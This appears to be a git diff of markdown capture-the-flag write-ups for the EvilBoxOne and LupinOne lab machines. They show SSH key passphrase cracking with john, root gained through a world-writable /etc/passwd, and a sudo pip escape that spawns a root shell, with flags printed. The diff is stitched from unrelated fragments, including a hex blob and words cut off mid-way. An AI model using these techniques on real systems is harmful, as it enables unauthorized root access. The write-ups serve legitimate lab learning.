ff65c5e344b3a5112417794436caf6fad66fb3a61834423587d77d609da048855223d672e74da8bdf7ebd87707bcfbc9c9ab8fd65e190df954d85e77444f61f47c5353140a9b9361c6cbafbaa92ff843a0d55714c7769e038364119d14e3a7be1d435359ee3bae72f5bb0c1144f822bcd1d92bafdc85cb26d552a0701eb9a64151462e44b623ff243958c88c52a4190e2b35158a568a3f1da46823f7f61bab5b12239572550c4fc8aeb4083c4b854
+
+┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
+└─$ john hash1 --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+unicorn          (hash)
+1g 0:00:00:00 DONE (2023-11-12 22:59) 100.0g/s 124200p/s 124200c/s 124200C/s unicorn
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+Now, we can login ssh with id_rsa.
+
+### 4. login ssh
+
+```shell
+┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
+└─$ ssh mowree@172.16.86.147 -i hash
+Enter passphrase for key 'hash':
+Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+mowree@EvilBoxOne:~$ id
+uid=1000(mowree) gid=1000(mowree) groups=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+```
+
+## 4. Privilege Escalation
+
+Now we have normal username and can login ssh, we need to be root.
+
+Find some application with root privilege:
+
+```shell
+mowree@EvilBoxOne:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+```
+
+We has not found somenthing special. Return `/etc/passwd`:
+
+```shell
+mowree@EvilBoxOne:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mowree@EvilBoxOne:~$ ls -la /etc/passwd
+-rw-rw-rw- 1 root root 1398 Aug 16  2021 /etc/passwd
+```
+
+Everyone can modify the `/etc/passwd`, 
+
+So we can consider remove root's passwd, just remove `x` character. But it doesn't work.
+
+Ok, change the root's passwd. Because the root's passwd is stored in `/etc/shadow` file, so here is `x` . We can just change `x` to password's MD5 hash,and then can change root's password.
+
+```shell
+mowree@EvilBoxOne:~$ openssl passwd -1
+Password:								--> root's passwd is root
+Verifying - Password:		--> root
+$1$BVZFyXa8$KD/LR0zYZNZ1w5gurJUy4/
+```
+
+Change the root's passwd:
+
+```shell
+mowree@EvilBoxOne:~$ vi /etc/passwd
+mowree@EvilBoxOne:~$ su
+Password:
+root@EvilBoxOne:/home/mowree# id
+uid=0(root) gid=0(root) groups=0(root)
+root@EvilBoxOne:/home/mowree# ls -la /root
+total 24
+drwx------  3 root root 4096 Aug 16  2021 .
+drwxr-xr-x 18 root root 4096 Aug 16  2021 ..
+lrwxrwxrwx  1 root root    9 Aug 16  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3526 Aug 16  2021 .bashrc
+drwxr-xr-x  3 root root 4096 Aug 16  2021 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-r--------  1 root root   31 Aug 16  2021 root.txt
+root@EvilBoxOne:/home/mowree# cat /root/root.txt
+36QtXfdJWvdC0VavlPIApUbDlqTsBM
+```
+
+So, that;s all.
+
+## Notes
+
+
+ndatoryWorkflow |
 | tblWorkflowStates            |
 | tblWorkflowTransitionGroups  |
 | tblWorkflowTransitionUsers   |
@@ -577,112 +663,6 @@ ls /root
 app.apk  Documents  Music     Public  Templates
 Desktop  Downloads  Pictures  snap    Videos
 ```
-
-## Notes
-
-
-ge the `/usr/lib/python3.9/webbrowser.py` file to achive the root.
-
-Modify the file `/usr/lib/python3.9/webbrowser.py` as follows, add some payload:
-
-![image-20231113175900550](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131759811.png)
-
-And then execute the heist.py file:
-
-```shell
-icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
-arsene@LupinOne:/home/icex64$ id
-uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
-arsene@LupinOne:/home/icex64$ cd /home/arsene/
-arsene@LupinOne:~$ ls
-heist.py  note.txt
-arsene@LupinOne:~$ cat note.txt
-Hi my friend Icex64,
-
-Can you please help check if my code is secure to run, I need to use for my next heist.
-
-I dont want to anyone else get inside it, because it can compromise my account and find my secret file.
-
-Only you have access to my program, because I know that your account is secure.
-
-See you on the other side.
-
-Arsene Lupin.
-```
-
-Well, how we can get root? Condiser the `sudo -l`:
-
-```shell
-arsene@LupinOne:~$ sudo -l
-Matching Defaults entries for arsene on LupinOne:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User arsene may run the following commands on LupinOne:
-    (root) NOPASSWD: /usr/bin/pip
-```
-
-The pip application has root privilege, so we can use it:
-
-```shell
-arsene@LupinOne:~$ TF=$(mktemp -d)
-echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
-sudo pip install $TF
-Processing /tmp/tmp.e43H2KlJDL
-# id
-uid=0(root) gid=0(root) groups=0(root)
-# ls /root
-root.txt
-# cat /root/root.txt
-*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
-,                       .&&&&&&&&&(            /&&&&&&&&&
-,                    &&&&&&*                          @&&&&&&
-,                *&&&&&                                   &&&&&&
-,              &&&&&                                         &&&&&.
-,            &&&&                   ./#%@@&#,                   &&&&*
-,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&
-,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&
-,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&
-,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&
-,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&
-,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&
-,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/
-,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &
-, & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@
-,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & &
-*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
-*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
-*& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
-*&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
-*% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
-*& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
-*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
-*& &                    &&&&&        /   /&&&&         &&&                   & @
-*/(,                      &&                            &                   / &.
-* & &                     &&&       #             &&&&&&      @             & &.
-* .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @,
-/  & %                   .&&&&  &@ @                 &/                    @ &
-*   & @                  &&&&&&    &&.               ,                    & &
-*    & &               &&&&&&&&&& &    &&&(          &                   & &
-,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &
-,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &
-,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &
-,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*
-,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@
-,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&
-,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&
-,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&
-/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,
-,                           &&&&&/...         .#&&&&#
-
-3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
-See you on the next heist.
-```
-
-
-
-
-
-
 
 ## Notes
 
